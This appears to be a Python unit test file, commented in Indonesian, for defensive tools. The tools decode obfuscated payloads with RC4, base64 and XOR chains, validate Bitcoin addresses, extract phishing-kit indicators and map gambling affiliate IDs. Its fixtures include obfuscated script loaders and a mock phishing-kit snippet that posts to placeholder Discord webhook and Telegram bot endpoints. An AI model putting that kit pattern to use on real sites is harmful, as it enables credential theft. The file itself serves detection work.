"""B2: deobfuscation & attribution kit — decoder rantai (RC4 test vector),
wallet anti-FP base58check, ekstraksi kit, pemetaan afiliasi."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from cyphron.guardrails.authorization import AuditLog, AuthorizationGate
from cyphron.tools import build_default_registry
from cyphron.tools.base import ToolContext
from cyphron.tools.deobf import (
    AffiliateMapperTool, ChainDecoderTool, PhishingKitExtractTool,
    WalletFpGuardTool, base58check_valid, chain_decode, rc4)
from cyphron.world.model import WorldModel

# test vector klasik RC4: key "Key", plaintext "Plaintext"
_RC4_HEX = "bbf316e8d940af0ad3"
# alamat genesis Bitcoin (checksum valid) + versi rusak
_ADDR_OK = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
_ADDR_BAD = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"


def _ctx() -> ToolContext:
    return ToolContext(gate=AuthorizationGate(None), audit=AuditLog(),
                       world=WorldModel(), rate_limit_s=0.0)


class TestDecoder(unittest.TestCase):
    def test_rc4_test_vector(self):
        self.assertEqual(rc4(b"Key", b"Plaintext").hex(), _RC4_HEX)

    def test_chain_b64_rc4_roundtrip(self):
        import base64
        cipher = rc4(b"kunci", b"<script>eval(atob(payload))</script>")
        blob = base64.b64encode(cipher).decode()
        out = chain_decode(blob, ["b64", "rc4"], key="kunci")
        self.assertIn("eval(atob", out.decode())

    def test_chain_hex_xor_rot13(self):
        import base64
        blob = base64.b64encode(b"uryyb jbeyq").decode()  # rot13("hello world")
        out = chain_decode(blob, ["b64", "rot13"])
        self.assertEqual(out, b"hello world")
        xored = bytes(b ^ 0x41 for b in b"secret")
        self.assertEqual(chain_decode(xored.hex(), ["hex", "xor"], key="A"),
                         b"secret")

    def test_step_tak_dikenal_gagal_jelas(self):
        with self.assertRaises(ValueError):
            chain_decode("x", ["rot-naga"])

    def test_chain_decoder_engine(self):
        import base64
        cipher = rc4(b"kunci", b"document.write(unescape(x))")
        blob = base64.b64encode(cipher).decode()
        res = ChainDecoderTool().run({"blob": blob, "chain": ["b64", "rc4"],
                                      "key": "kunci"}, _ctx())
        self.assertTrue(res.ok, res.error)
        self.assertIn("unescape", res.data["decoded"])
        self.assertTrue(res.data["markers"])
        self.assertEqual(len(res.findings), 1)
        self.assertEqual(res.findings[0].finding_class, "surface")


class TestWalletFpGuard(unittest.TestCase):
    def test_base58check_validasi(self):
        self.assertTrue(base58check_valid(_ADDR_OK))
        self.assertFalse(base58check_valid(_ADDR_BAD))
        self.assertFalse(base58check_valid("0OIl-harakat-tak-sah"))

    def test_hanya_alamat_valid_yang_dilaporkan(self):
        text = (f"kontak: {_ADDR_OK} dan palsu {_ADDR_BAD} "
                "plus acak 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH")
        res = WalletFpGuardTool().run({"texts": [text]}, _ctx())
        valid = res.data["valid"]
        self.assertIn(_ADDR_OK, valid)
        self.assertNotIn(_ADDR_BAD, valid, "checksum gagal wajib dibuang")
        self.assertIn(_ADDR_BAD, res.data["rejected_by_checksum"])
        self.assertEqual(len(res.findings), 1)
        # alamat tidak tercetak penuh di deskripsi (redaksi)
        self.assertNotIn(_ADDR_OK, res.findings[0].description)


class TestKitExtractAndAffiliate(unittest.TestCase):
    KIT = """
      var cfg = {chat_id: "77889900", endpoint: "https://discord.com/api/webhooks/1234567890/AbCdEfGh-IjKlMnOpQrStUvWxYz"};
      document.write(unescape("%3Cscript%3E"));
      fetch("https://api.telegram.org/bot111222333:AAEfxAmpleTokenxyz/sendMessage");
      admin-panel/login
    """

    def test_kit_indikator(self):
        res = PhishingKitExtractTool().run({"texts": [self.KIT]}, _ctx())
        self.assertGreater(res.data["webhook_count"], 0)
        self.assertIn("77889900", res.data["telegram_chat_ids"])
        self.assertIn("unescape loader", res.data["loader_markers"])
        self.assertTrue(res.data["panel_hints"])
        self.assertEqual(len(res.findings), 1)
        # webhook direduksi di data — token tidak tercetak penuh
        self.assertTrue(all("[redacted]" in w for w in
                            res.data["webhooks_redacted"]))

    def test_affiliate_clustering(self):
        urls = ["https://kasus.example/landing?ref=gamblernet-77",
                "https://kasus.example/daftar?ref=gamblernet-77&utm_campaign=winter",
                "https://kasus.example/lain?aff=satelit-9"]
        res = AffiliateMapperTool().run({"urls": urls}, _ctx())
        ids = res.data["affiliate_ids"]
        self.assertIn("gamblernet-77", ids)
        self.assertIn("satelit-9", ids)
        self.assertIn("winter", ids)
        self.assertEqual(res.data["unique"], 3)

    def test_engine_terdaftar(self):
        ctx = _ctx()
        names = {t.name for t in build_default_registry(ctx).all()}
        for n in ("chain_decoder", "wallet_fp_guard", "phishing_kit_extract",
                  "affiliate_mapper"):
            self.assertIn(n, names)


if __name__ == "__main__":
    unittest.main()
